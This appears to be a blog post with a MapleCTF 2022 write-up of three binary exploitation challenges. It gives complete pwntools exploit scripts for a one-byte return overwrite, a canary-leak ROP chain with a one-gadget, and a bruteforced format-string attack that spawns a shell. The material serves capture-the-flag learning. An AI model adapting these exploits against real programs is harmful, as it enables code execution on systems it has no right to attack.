@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="warmup1A simple 1 byte buffer overflow to overwrite the first byte of the return address to main and jump to win function.  EXP: 123456789101112131415161718192021from pwn import *context.arch &#x3D; &quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MapleCTF 2022">
+<meta property="og:url" content="https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/index.html">
+<meta property="og:site_name" content="Thomason&#39;s Blog">
+<meta property="og:description" content="warmup1A simple 1 byte buffer overflow to overwrite the first byte of the return address to main and jump to win function.  EXP: 123456789101112131415161718192021from pwn import *context.arch &#x3D; &quot;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-27T05:14:18.000Z">
+<meta property="article:modified_time" content="2022-08-29T22:49:17.630Z">
+<meta property="article:author" content="Thomason Zhao">
+<meta property="article:tag" content="MapleCTF">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>MapleCTF 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+  <!-- fancybox support -->
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/26/CTFZone-2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&text=MapleCTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&is_video=false&description=MapleCTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MapleCTF 2022&body=Check out this article: https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&name=MapleCTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&t=MapleCTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup1"><span class="toc-number">1.</span> <span class="toc-text">warmup1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup2"><span class="toc-number">2.</span> <span class="toc-text">warmup2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printf-learned-from-WP"><span class="toc-number">3.</span> <span class="toc-text">printf (learned from WP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        MapleCTF 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Thomason Zhao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-27T05:14:18.000Z" itemprop="datePublished">2022-08-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Writeup/">CTF Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/MapleCTF/" rel="tag">MapleCTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="warmup1"><a href="#warmup1" class="headerlink" title="warmup1"></a>warmup1</h2><p>A simple 1 byte buffer overflow to overwrite the first byte of the return address to main and jump to <code>win</code> function. </p>
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;warmup1.ctf.maplebacon.org&quot;</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./warmup1&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit starts here</span></span><br><span class="line">padding = <span class="number">24</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * padding + <span class="string">b&quot;\x19&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall(timeout=<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="warmup2"><a href="#warmup2" class="headerlink" title="warmup2"></a>warmup2</h2><p>Very similar to <code>warmup1</code>, but with canary, ASLR all enabled. However, it provides us two <code>printf</code> function which can be used to leak canary and base addresses. </p>
+<p>First to leak out canary and stack address, then repeat the function by overwrite first byte of return address (actually we can repea arbitrary times to get everything we want). Then construct ROP chain to leak libc address, finally attack by using the one-gadget. </p>
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;warmup2.ctf.maplebacon.org&quot;</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./warmup2&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit starts here</span></span><br><span class="line">padding = <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, <span class="string">b&quot;A&quot;</span> * (padding + <span class="number">1</span>))</span><br><span class="line">rl()</span><br><span class="line">msg = rl()</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + msg[<span class="number">0x10f</span>:<span class="number">0x10f</span> + <span class="number">7</span>])</span><br><span class="line">info(<span class="string">&quot;CANARY LEAKED&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = u64(msg[<span class="number">0x116</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;STACK_ADDR LEAKED&quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, <span class="string">b&quot;B&quot;</span> * padding + p64(canary) + p64(stack_addr) + <span class="string">b&#x27;\xd8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, <span class="string">b&quot;C&quot;</span> * (padding + <span class="number">0x10</span>))</span><br><span class="line">ru(<span class="string">&quot;Hello &quot;</span>)</span><br><span class="line">msg = rl()</span><br><span class="line">return_addr = u64(msg[padding + <span class="number">0x10</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">elf.address = return_addr - <span class="number">0x12e2</span></span><br><span class="line">info(<span class="string">&quot;RETURN_ADDR LEAKED: &quot;</span> + <span class="built_in">hex</span>(return_addr))</span><br><span class="line">info(<span class="string">&quot;ELF_BASE CALCULATED: &quot;</span> + <span class="built_in">hex</span>(elf.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># start exploit</span></span><br><span class="line">pop_rdi = elf.address + <span class="number">0x1353</span></span><br><span class="line">payload = flat(</span><br><span class="line">        <span class="string">b&quot;D&quot;</span> * padding,</span><br><span class="line">        canary,</span><br><span class="line">        <span class="string">b&quot;D&quot;</span> * <span class="number">8</span>,</span><br><span class="line">        pop_rdi,</span><br><span class="line">        elf.got[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.plt[<span class="string">&quot;puts&quot;</span>],</span><br><span class="line">        elf.symbols[<span class="string">b&#x27;vuln&#x27;</span>],</span><br><span class="line">        )</span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, payload)</span><br><span class="line">ru(<span class="string">&quot;Wow, I&#x27;m &quot;</span>)</span><br><span class="line">rl()</span><br><span class="line">msg = rl()</span><br><span class="line">putsaddr=u64(msg[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts-&gt;&#x27;</span>+<span class="built_in">hex</span>(putsaddr))</span><br><span class="line">libc.address = putsaddr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">        <span class="string">b&quot;E&quot;</span> * padding,</span><br><span class="line">        canary,</span><br><span class="line">        <span class="string">b&quot;E&quot;</span> * <span class="number">8</span>,</span><br><span class="line">        libc.address + <span class="number">0xe3b01</span>, <span class="comment"># one gadget</span></span><br><span class="line">        )</span><br><span class="line">sa(<span class="string">&quot;?&quot;</span>, payload)</span><br><span class="line">sl(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="printf-learned-from-WP"><a href="#printf-learned-from-WP" class="headerlink" title="printf (learned from WP)"></a>printf (learned from WP)</h2><p>The program takes in the user input and then <code>printf</code> out. Classic format string challenge. However, I stuck at reruning the <code>printf</code> function to overwrite the return address. I thought of overwrite the chain pointers and get control, but failed because one <code>printf</code> don’t allow to overwrite two places (return address and a pointer) </p>
+<p>After looking at the WP in the <a href="#reference">reference</a> section, they said all the secrets are lie in the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1748">source code</a>. </p>
+<p>The source code tell us that when it encounters the position character, <code>$</code>, it will store the value of positions into an internal buffer called <code>args_value</code>. So when doing the overwrite by using <code>%n</code>, the value was fatched is the initial value instead of the changed value. To get rid of this, we need to construct payload without the first <code>$</code> character. Instead, we may use <code>%c</code> or <code>%p</code> to get to the right poisition on stack.</p>
+<p>That’s all the information we can get, however, we still can’t know the stack address to do the overwrite. That’s where the bruteforce comes in (but tipically, CTF will not have bruteforce challenges to prevent DDoS the platform). </p>
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;printf.ctf.maplebacon.org&quot;</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./printf&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        p = process(elf.file.name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Exploit starts here</span></span><br><span class="line">    <span class="comment"># registers part</span></span><br><span class="line">    payload = <span class="string">&quot;%c&quot;</span> * <span class="number">3</span></span><br><span class="line">    size = <span class="number">3</span></span><br><span class="line">    payload += <span class="string">&quot;%p&quot;</span> <span class="comment"># bss (program addr)</span></span><br><span class="line">    size += <span class="number">14</span></span><br><span class="line">    payload += <span class="string">&quot;%c&quot;</span></span><br><span class="line">    size += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># stack part</span></span><br><span class="line">    payload += <span class="string">&quot;%p&quot;</span> <span class="comment"># stack addr</span></span><br><span class="line">    size += <span class="number">14</span></span><br><span class="line">    payload += <span class="string">&quot;%c&quot;</span> * <span class="number">6</span></span><br><span class="line">    size += <span class="number">6</span></span><br><span class="line">    payload += <span class="string">&quot;%p&quot;</span> <span class="comment"># libc_start_main (libc addr)</span></span><br><span class="line">    size += <span class="number">14</span></span><br><span class="line">    payload += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x7348</span> - size) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%hn%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xed</span> - <span class="number">0x48</span>) + <span class="string">&quot;c%43$hhn&quot;</span></span><br><span class="line">    <span class="comment"># payload += &quot;%&quot; + str(0x178 - 0xed) + &quot;%6$hhn&quot; # prepare pointer to overwrite the libc_start_main</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    base_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x4040</span></span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    stack_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_addr = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(base_addr), <span class="built_in">hex</span>(stack_addr), <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stack_addr &amp; <span class="number">0xffff</span>) != <span class="number">0x7350</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!bruteforce success!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">    <span class="comment"># if LOCAL:</span></span><br><span class="line">    <span class="comment">#     gdb.attach(p, &quot;b *go + 0x36\nc&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># start exploit</span></span><br><span class="line">    one_gadget = libc_addr + <span class="number">0xe3b01</span></span><br><span class="line">    low_word = one_gadget &amp; <span class="number">0xffff</span> </span><br><span class="line">    low_word2 = (one_gadget &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># setup the pointer for overwrite the return addr of main</span></span><br><span class="line">    payload2 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x78</span>) + <span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">    payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xed</span> - <span class="number">0x78</span>) + <span class="string">&quot;c%43$hhn&quot;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite part of the address</span></span><br><span class="line">    payload2 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x7a</span>) + <span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">    payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0xed</span> - <span class="number">0x7a</span>) + <span class="string">&quot;c%43$hhn&quot;</span></span><br><span class="line">    payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(low_word - <span class="number">0xed</span>) + <span class="string">&quot;c%8$hn&quot;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># finish up and get shell</span></span><br><span class="line">    payload2 = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(low_word2) + <span class="string">&quot;c%8$hn&quot;</span></span><br><span class="line">    sl(payload2)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="http://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/">http://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/</a><br><a target="_blank" rel="noopener" href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/hxp2020-still-printf.py">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/hxp2020-still-printf.py</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup1"><span class="toc-number">1.</span> <span class="toc-text">warmup1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup2"><span class="toc-number">2.</span> <span class="toc-text">warmup2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printf-learned-from-WP"><span class="toc-number">3.</span> <span class="toc-text">printf (learned from WP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&text=MapleCTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&title=MapleCTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/&is_video=false&description=MapleCTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MapleCTF 2022&body=Check out this article: https://thomasonzhao.github.io/2022/08/27/MapleCTF-2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
